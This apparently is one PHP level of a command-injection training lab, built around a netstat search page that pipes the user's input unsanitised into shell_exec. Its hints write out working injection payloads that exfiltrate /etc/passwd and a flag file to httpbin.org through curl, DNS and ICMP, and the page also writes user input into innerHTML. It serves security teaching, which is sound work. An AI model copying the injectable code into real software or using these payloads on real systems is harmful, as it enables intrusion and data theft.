<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Level 9 - Out-of-Band Injection</title>
    <link rel="stylesheet" href="css/styles.css">
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🌐 Level 9 - Out-of-Band Injection</h1>
            <p><strong>Objective:</strong> Sử dụng out-of-band techniques để exfiltrate data qua network</p>
        </div>

        <div class="form-container">
            <h3>🔍 Network Monitor:</h3>
            <p>Hệ thống monitor network connections. Output bị disabled và không có file system access.</p>
            
            <div class="code-block">Command: netstat -an | grep <?php echo htmlspecialchars($_GET['pattern'] ?? '[PATTERN]'); ?> > /dev/null 2>&1</div>
            
            <?php
            if (isset($_GET['pattern'])) {
                echo '<h3>📊 Result:</h3>';
                echo '<div class="result">';
                
                $pattern = $_GET['pattern'];
                
                // Execute command but completely hide output (simulate restricted environment)
                $command = "netstat -an | grep " . $pattern . " > /dev/null 2>&1";
                $result = shell_exec($command);
                
                // Always show the same generic response regardless of input
                echo '<div class="success">✅ Network monitoring completed</div>';
                echo '<div class="success">📊 Results logged to internal system</div>';
                echo '<div class="success">🔒 No direct output available for security reasons</div>';
                
                echo '</div>';
            }
            ?>
            
            <h3>🔧 Try Your Input:</h3>
            <form method="get" style="margin: 20px 0;">
                <div class="form-group">
                    <label for="pattern">Search Pattern:</label>
                    <input type="text" id="pattern" name="pattern" value="<?php echo htmlspecialchars($_GET['pattern'] ?? ''); ?>" placeholder="Enter search pattern (e.g., :80)" oninput="updateCommand()">
                </div>
                <button type="submit" class="btn">🚀 Monitor Network</button>
            </form>

            <div class="info-card" style="margin: 20px 0;">
                <h3>🌐 Out-of-Band Scenario</h3>
                <ul>
                    <li><strong>No output visible:</strong> Results completely hidden</li>
                    <li><strong>No file system:</strong> Cannot write to web directories</li>
                    <li><strong>Network available:</strong> Can make external connections</li>
                    <li><strong>Challenge:</strong> Extract data using network channels</li>
                </ul>
            </div>

            <div class="info-card" style="margin: 20px 0;">
                <h3>📡 Out-of-Band Techniques</h3>
                <ul>
                    <li><strong>DNS exfiltration:</strong> Encode data in DNS queries</li>
                    <li><strong>HTTP requests:</strong> Send data via GET/POST to external server</li>
                    <li><strong>ICMP tunneling:</strong> Use ping with data payload</li>
                    <li><strong>Email exfiltration:</strong> Send data via email if available</li>
                    <li><strong>Log injection:</strong> Inject into centralized logging systems</li>
                </ul>
            </div>

            <div class="hint-container">
                <button onclick="showNextHint()" class="btn hint-btn">💡 Get Hint</button>
                <div id="hint-1" class="hint-box" style="display: none;">
                    <h4>💡 Hint 1: Understanding Out-of-Band</h4>
                    <p><strong>Current Command:</strong> <code>netstat -an | grep [PATTERN] > /dev/null 2>&1</code></p>
                    <p>📝 <strong>Test normal:</strong> <code>:80</code> (shows same result as any input)</p>
                    <p>📝 <strong>Challenge:</strong> No output, no file access - need external channel</p>
                    <p>🎯 <strong>Goal:</strong> Get data out of the system using network</p>
                </div>
                <div id="hint-2" class="hint-box" style="display: none;">
                    <h4>💡 Hint 2: DNS Exfiltration Setup</h4>
                    <p><strong>Concept:</strong> Use DNS queries to exfiltrate data</p>
                    <p>📝 <strong>Method:</strong> Create subdomains containing your data</p>
                    <p><strong>First, test basic injection:</strong></p>
                    <p><code>:80; nslookup test.example.com</code></p>
                    <p>🎯 <strong>Explanation:</strong> If successful, this makes a DNS query</p>
                    <p><strong>Note:</strong> You need a domain/server you control to see the queries</p>
                </div>
                <div id="hint-3" class="hint-box" style="display: none;">
                    <h4>💡 Hint 3: HTTP Exfiltration</h4>
                    <p><strong>Concept:</strong> Send data via HTTP requests to external server</p>
                    <p>📝 <strong>Basic test:</strong> <code>:80; curl http://httpbin.org/get</code></p>
                    <p>📝 <strong>With data:</strong> <code>:80; curl "http://httpbin.org/get?data=$(whoami)"</code></p>
                    <p>🎯 <strong>Advantage:</strong> httpbin.org shows all request details</p>
                    <p><strong>Alternative services:</strong></p>
                    <p>• webhook.site - Generates unique URLs</p>
                    <p>• requestbin.com - Captures HTTP requests</p>
                </div>
                <div id="hint-4" class="hint-box" style="display: none;">
                    <h4>💡 Hint 4: Data Encoding for Exfiltration</h4>
                    <p><strong>Concept:</strong> Encode sensitive data for safe transmission</p>
                    <p>📝 <strong>Base64 encoding:</strong></p>
                    <p><code>:80; curl "http://httpbin.org/get?data=$(cat /etc/passwd | base64 -w 0)"</code></p>
                    <p>📝 <strong>Hex encoding:</strong></p>
                    <p><code>:80; curl "http://httpbin.org/get?data=$(xxd -p /etc/passwd | tr -d '\n')"</code></p>
                    <p>🎯 <strong>Benefits:</strong> Avoids issues with special characters in URLs</p>
                </div>
                <div id="hint-5" class="hint-box" style="display: none;">
                    <h4>💡 Hint 5: Chunked Data Exfiltration</h4>
                    <p><strong>Concept:</strong> Split large files into smaller chunks</p>
                    <p>📝 <strong>Method 1 (Line by line):</strong></p>
                    <p><code>:80; head -1 /etc/passwd | curl -d @- http://httpbin.org/post</code></p>
                    <p>📝 <strong>Method 2 (Byte chunks):</strong></p>
                    <p><code>:80; dd if=/etc/passwd bs=50 count=1 2>/dev/null | base64 -w 0 | curl -d @- http://httpbin.org/post</code></p>
                    <p>🎯 <strong>Use case:</strong> Avoid URL length limits and detection</p>
                </div>
                <div id="hint-6" class="hint-box" style="display: none;">
                    <h4>💡 Hint 6: ICMP Exfiltration</h4>
                    <p><strong>Concept:</strong> Use ping to carry data in ICMP packets</p>
                    <p>📝 <strong>Method:</strong> Embed data in ping requests</p>
                    <p><code>:80; ping -c 1 -p $(echo "test" | xxd -p) 8.8.8.8</code></p>
                    <p>🎯 <strong>Note:</strong> Data is in the ICMP packet payload</p>
                    <p><strong>Advanced:</strong> Extract flag and ping with it</p>
                    <p><code>:80; ping -c 1 -p $(head -c 20 /var/flags/level9_oob.txt | xxd -p) 8.8.8.8</code></p>
                </div>
                <div id="hint-7" class="hint-box" style="display: none;">
                    <h4>💡 Hint 7: Automated Exfiltration Script</h4>
                    <p><strong>Concept:</strong> Create a loop to exfiltrate entire files</p>
                    <p>📝 <strong>Line-by-line exfiltration:</strong></p>
                    <p><code>:80; for i in {1..10}; do line=$(sed -n "${i}p" /var/flags/level9_oob.txt); curl "http://httpbin.org/get?line=${i}&data=${line}"; done</code></p>
                    <p>🎯 <strong>Alternative with while loop:</strong></p>
                    <p><code>:80; cat /var/flags/level9_oob.txt | while read line; do curl "http://httpbin.org/get?data=${line}"; done</code></p>
                </div>
                <div id="hint-8" class="hint-box" style="display: none;">
                    <h4>🎯 Hint 8: Extract the Flag!</h4>
                    <p><strong>🚀 Target file:</strong> <code>/var/flags/level9_oob.txt</code></p>
                    <p><strong>Method 1 (Direct HTTP):</strong></p>
                    <p><code>:80; curl "http://httpbin.org/get?flag=$(cat /var/flags/level9_oob.txt)"</code></p>
                    <p><strong>Method 2 (Base64 encoded):</strong></p>
                    <p><code>:80; curl "http://httpbin.org/get?flag=$(base64 -w 0 /var/flags/level9_oob.txt)"</code></p>
                    <p><strong>🌐 Check result:</strong> Visit httpbin.org response to see your exfiltrated data</p>
                    <p><strong>🎯 Expected Flag:</strong> <code>FLAG{out_of_band_data_exfiltration}</code></p>
                </div>
            </div>
        </div>
        
        <div class="navigation">
            <a href="level8.php">⬅️ Previous Level</a>
            <a href="index.php">🏠 Home</a>
            <a href="level10.php">➡️ Next Level</a>
            <a href="submit.php?level=9">🏆 Submit Flag</a>
        </div>
    </div>

    <script>
    let currentHint = 0;
    const maxHints = 8;

    function showNextHint() {
        if (currentHint < maxHints) {
            currentHint++;
            document.getElementById('hint-' + currentHint).style.display = 'block';
            
            if (currentHint === maxHints) {
                document.querySelector('.hint-btn').style.display = 'none';
            }
        }
    }

    function updateCommand() {
        const pattern = document.getElementById('pattern').value;
        const codeBlock = document.querySelector('.code-block');
        codeBlock.innerHTML = `Command: netstat -an | grep <span style="color: #ed8936; font-weight: bold;">${pattern || '[PATTERN]'}</span> > /dev/null 2>&1`;
    }
    </script>
</body>
</html>
